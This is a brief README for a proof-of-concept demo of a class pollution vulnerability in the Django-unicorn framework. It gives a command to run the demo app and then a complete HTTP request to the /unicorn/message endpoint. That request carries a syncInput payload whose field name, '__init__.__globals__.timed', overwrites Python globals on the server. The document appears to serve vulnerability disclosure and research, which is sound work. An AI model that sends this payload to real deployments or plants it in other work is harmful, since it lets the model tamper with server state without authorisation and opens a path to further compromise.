# Class Pollution Demo for Django-unicorn

## Django-unicorn
Django-unicorn is a full-stack framework for building django apps with unicorn views, unicorn fields, and unicorn components. The python class pollution origniated from its component request handling process.

## Deploy

Run the following command to deploy the app:
```
python manage.py runserver
```

## PoC

The checksum and corresponding encrypted data can be obtained from front-end source code.

```
POST /unicorn/message/todo HTTP/1.1
Host: proof-of-concept:8000
Cookie: csrftoken=OATsBHC6Q6LEF4qWFWyY5Efrcq9nf6RxuD6TR06vIs1zaKPLQwlKJMYv8LZTA2Fo;
Connection: keep-alive
Accept: Application/json
X-CSRFToken: foA7F7t1ICwsHVsgTfPAC12n00ZvNqpTVrNyVqXqAYMncBR54PCmg9LrWlP18mdK
Content-Length: 214

{
"id":  123,
"actionQueue":[{"type": "syncInput",
	"payload": {
"name": "__init__.__globals__.timed",
"value":"polluted"
}
}],
"data":{"task":"","tasks":[]},
"epoch": "123",
"checksum": "N5mmXeUP"
}

```